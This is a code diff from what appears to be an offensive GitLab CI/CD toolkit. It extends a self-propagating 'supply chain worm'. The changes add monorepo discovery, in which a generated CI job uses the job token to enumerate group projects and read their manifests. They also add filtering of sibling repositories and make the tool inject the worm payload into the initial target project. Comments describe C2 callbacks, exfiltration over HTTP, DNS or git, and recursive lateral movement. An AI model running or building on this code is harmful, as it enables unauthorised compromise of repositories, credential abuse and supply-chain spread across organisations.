@@ -23,16 +23,17 @@ import (
 // 3. Auto-injects into sibling repos using harvested credentials
 // 4. Repeat recursively for lateral movement
 type SupplyChainWormOptions struct {
-	Common       CommonOptions
-	Payload      string // The actual payload to inject into sibling repos
-	Discovery    string // How to find sibling repos: "path", "topic", "language", "description"
-	DiscoveryVal string // Value to match (e.g., "path:src/", "topic:react")
-	ExfilMethod  string // "artifact", "http", "git", "dns"
-	ExfilTarget  string // Target URL/domain/git-repo
-	CallbackURL  string // C2 callback URL
-	Depth        int    // Max recursion depth (0=infinite)
-	DelayMinutes int    // Delay between propagation waves (0=immediate)
-	StableName   string // Job name for stability across propagation waves
+	Common        CommonOptions
+	Payload       string // The actual payload to inject into sibling repos
+	Discovery     string // How to find sibling repos: "path", "topic", "language", "description", "monorepo"
+	DiscoveryVal  string // Value to match (e.g., "path:src/", "topic:react")
+	ExfilMethod   string // "artifact", "http", "git", "dns"
+	ExfilTarget   string // Target URL/domain/git-repo
+	CallbackURL   string // C2 callback URL
+	Depth         int    // Max recursion depth (0=infinite)
+	DelayMinutes  int    // Delay between propagation waves (0=immediate)
+	StableName    string // Job name for stability across propagation waves
+	MonorepoScope bool   // Discover siblings via package manifests (npm @scope/*, go.mod, Cargo.toml)
 }
 
 // GenerateSupplyChainWormYAML returns a CI job that performs self-propagation.
@@ -129,6 +130,40 @@ _WORM() {
     echo "[+] Found $_sib_count repos with language filter"
   fi
 `, o.DiscoveryVal, getBaseURL(), o.DiscoveryVal)
+	case "monorepo":
+		fmt.Fprintf(&b, `  # Monorepo discovery — search for sibling packages via manifests
+  echo "[*] Scanning for monorepo siblings (npm @scope, go.mod, Cargo.toml)..."
+  _group_id=$(echo "$CI_PROJECT_NAMESPACE_ID")
+  _sibling_json=$(curl -sS -H "PRIVATE-TOKEN: $CI_JOB_TOKEN" \
+    "%s/api/v4/groups/$_group_id/projects?per_page=100&include_subgroups=true" 2>/dev/null)
+  # Filter to repos with package manifests
+  _sib_ids=""
+  for _pid in $(echo "$_sibling_json" | grep -o '"id":[0-9]*' | cut -d: -f2); do
+    [ "$_pid" = "$CI_PROJECT_ID" ] && continue
+    # Check for package.json with @scope
+    _pkg=$(curl -sS -H "PRIVATE-TOKEN: $CI_JOB_TOKEN" \
+      "%s/api/v4/projects/$_pid/repository/files/package.json/raw?ref=main" 2>/dev/null)
+    if echo "$_pkg" | grep -q '"name".*"@'; then
+      _sib_ids="$_sib_ids $_pid"
+      continue
+    fi
+    # Check for go.mod
+    _gomod=$(curl -sS -H "PRIVATE-TOKEN: $CI_JOB_TOKEN" \
+      "%s/api/v4/projects/$_pid/repository/files/go.mod/raw?ref=main" 2>/dev/null)
+    if [ -n "$_gomod" ] && echo "$_gomod" | grep -q "^module "; then
+      _sib_ids="$_sib_ids $_pid"
+      continue
+    fi
+    # Check for Cargo.toml
+    _cargo=$(curl -sS -H "PRIVATE-TOKEN: $CI_JOB_TOKEN" \
+      "%s/api/v4/projects/$_pid/repository/files/Cargo.toml/raw?ref=main" 2>/dev/null)
+    if [ -n "$_cargo" ] && echo "$_cargo" | grep -q '^\[package\]'; then
+      _sib_ids="$_sib_ids $_pid"
+    fi
+  done
+  _sib_count=$(echo $_sib_ids | wc -w)
+  echo "[+] Found $_sib_count monorepo sibling packages"
+`, getBaseURL(), getBaseURL(), getBaseURL(), getBaseURL())
 	default:
 		fmt.Fprintf(&b, `  # Generic discovery — search all projects in namespace
   _sibling_json=$(curl -sS -H "PRIVATE-TOKEN: $CI_JOB_TOKEN" \
@@ -274,17 +309,18 @@ func getBaseURL() string {
 
 // SupplyChainWormResult reports the outcome of a worm propagation run.
 type SupplyChainWormResult struct {
-	Promoted int      `json:"promoted"` // repos successfully attacked
-	Failed   int      `json:"failed"`   // repos that failed
-	Errors   int      `json:"errors"`   // non-repo errors encountered
-	Targets  []string `json:"targets"`  // repos that were targeted
-	Err      string   `json:"error,omitempty"`
+	InitialCompromised bool     `json:"initial_compromised"` // target project executed the worm payload
+	Promoted           int      `json:"promoted"`            // sibling repos successfully attacked
+	Failed             int      `json:"failed"`              // repos that failed
+	Errors             int      `json:"errors"`              // non-repo errors encountered
+	Targets            []string `json:"targets"`             // repos that were targeted
+	Err                string   `json:"error,omitempty"`
 }
 
 // RunSupplyChainWorm performs a supply chain worm attack across sibling repos.
 // Uses the GitLab SDK directly — no attacker package dependency — so it
 // compiles cleanly inside the payloads sub-package.
-func RunSupplyChainWorm(ctx context.Context, client *gitlab.Client, targetProjectID any, groupPath, payload string, maxRepos int, branch string, authorName, authorEmail string, out io.Writer) SupplyChainWormResult {
+func RunSupplyChainWorm(ctx context.Context, client *gitlab.Client, targetProjectID any, groupPath, payload string, maxRepos int, branch string, authorName, authorEmail string, out io.Writer, monorepoScope bool) SupplyChainWormResult {
 	var res SupplyChainWormResult
 	if maxRepos <= 0 {
 		maxRepos = 5
@@ -302,17 +338,26 @@ func RunSupplyChainWorm(ctx context.Context, client *gitlab.Client, targetProjec
 		return res
 	}
 
-	var targetPath string
-	if p, _, perr := client.Projects.GetProject(targetProjectID, nil, gitlab.WithContext(ctx)); perr == nil {
-		targetPath = p.PathWithNamespace
+	targetProject, _, targetErr := client.Projects.GetProject(targetProjectID, nil, gitlab.WithContext(ctx))
+	if targetErr != nil {
+		res.Err = fmt.Sprintf("resolve target project: %v", targetErr)
+		return res
 	}
+	targetPath := targetProject.PathWithNamespace
 
-	siblings, listErr := discoverSiblings(ctx, client, groupPath, targetPath, maxRepos)
+	siblings, listErr := discoverSiblings(ctx, client, groupPath, targetPath, maxRepos, monorepoScope)
 	if listErr != "" {
 		res.Err = listErr
 	}
 
 	atk := newAttackerFromClient(client, authorName, authorEmail)
+	targetCI := buildWormCI(ctx, client, targetProject.ID, payload)
+	if err := injectWormPayload(ctx, atk, targetProject.ID, branch, targetCI, "build: initialize supply chain propagation", out); err != nil {
+		res.Failed++
+	} else {
+		res.InitialCompromised = true
+		res.Targets = append(res.Targets, fmt.Sprintf("%d", targetProject.ID))
+	}
 	for _, sibID := range siblings {
 		ciYAML := buildWormCI(ctx, client, sibID, payload)
 		msg := fmt.Sprintf("build: supply chain worm propagation via %s", targetPath)
@@ -326,7 +371,7 @@ func RunSupplyChainWorm(ctx context.Context, client *gitlab.Client, targetProjec
 	return res
 }
 
-func discoverSiblings(ctx context.Context, client *gitlab.Client, groupPath, targetPath string, maxRepos int) ([]int64, string) {
+func discoverSiblings(ctx context.Context, client *gitlab.Client, groupPath, targetPath string, maxRepos int, monorepoScope bool) ([]int64, string) {
 	var siblings []int64
 	page := int64(1)
 	for {
@@ -341,7 +386,7 @@ func discoverSiblings(ctx context.Context, client *gitlab.Client, groupPath, tar
 			return siblings, fmt.Sprintf("list group projects: %v", err)
 		}
 		for _, p := range projects {
-			if p.PathWithNamespace == targetPath {
+			if !eligibleWormSibling(p, targetPath) {
 				continue
 			}
 			siblings = append(siblings, p.ID)
@@ -354,7 +399,33 @@ func discoverSiblings(ctx context.Context, client *gitlab.Client, groupPath, tar
 		}
 		page = resp.NextPage
 	}
+	if monorepoScope && len(siblings) > 0 {
+		var filtered []int64
+		for _, sid := range siblings {
+			if hasPackageManifest(ctx, client, sid) {
+				filtered = append(filtered, sid)
+			}
+		}
+		siblings = filtered
+	}
 	return siblings, ""
+}
+
+func eligibleWormSibling(project *gitlab.Project, targetPath string) bool {
+	return project != nil &&
+		project.PathWithNamespace != targetPath &&
+		project.MarkedForDeletionOn == nil
+}
+
+func hasPackageManifest(ctx context.Context, client *gitlab.Client, projectID int64) bool {
+	manifests := []string{"package.json", "go.mod", "Cargo.toml", "pyproject.toml", "pom.xml", "build.gradle"}
+	for _, path := range manifests {
+		_, _, err := client.RepositoryFiles.GetFile(projectID, path, &gitlab.GetFileOptions{Ref: new("HEAD")}, gitlab.WithContext(ctx))
+		if err == nil {
+			return true
+		}
+	}
+	return false
 }
 
 var stagesInlineRe = regexp.MustCompile(`(?m)^stages:\s*\[([^\]]+)\]`)
